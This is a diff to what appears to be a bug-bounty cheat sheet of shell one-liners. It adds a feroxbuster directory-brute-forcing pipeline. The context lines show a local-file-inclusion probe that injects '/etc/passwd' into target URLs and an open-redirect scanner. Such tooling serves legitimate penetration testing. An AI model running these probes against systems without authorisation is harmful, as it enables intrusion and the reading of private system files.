@@ -211,3 +211,10 @@ gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl 
 ```bash
 export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
 ```
+
+## Directory Listing
+### (Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool
+> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
+```bash
+cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
+```
